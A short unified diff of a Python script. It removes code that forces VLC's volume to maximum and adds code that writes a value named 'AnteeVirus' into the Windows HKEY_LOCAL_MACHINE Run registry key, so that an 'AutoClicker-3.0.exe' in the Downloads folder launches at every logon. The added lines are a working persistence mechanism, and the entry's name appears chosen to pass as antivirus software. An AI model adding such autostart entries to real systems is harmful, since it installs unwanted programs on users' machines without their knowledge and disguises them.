@@ -1,18 +1,8 @@
-import pyautogui
-import ctypes
-import sys
-import PyWallpaper
-import time
+import winreg as wrg
 
-from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
+location = wrg.HKEY_LOCAL_MACHINE
 
+soft = wrg.OpenKeyEx(location, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",access=wrg.KEY_WRITE)
 
-def main():
-    sessions = AudioUtilities.GetAllSessions()
-    for session in sessions:
-        volume = session._ctl.QueryInterface(ISimpleAudioVolume)
-        if session.Process and session.Process.name() == "vlc.exe":
-            print("volume.GetMasterVolume(): %s" % volume.GetMasterVolume())
-            volume.SetMasterVolume(100, None)
-
-main()
+wrg.SetValueEx(soft, f"AnteeVirus", 0, wrg.REG_SZ, 
+               "C:\\Users\\User\\Download\\AutoClicker-3.0.exe") 
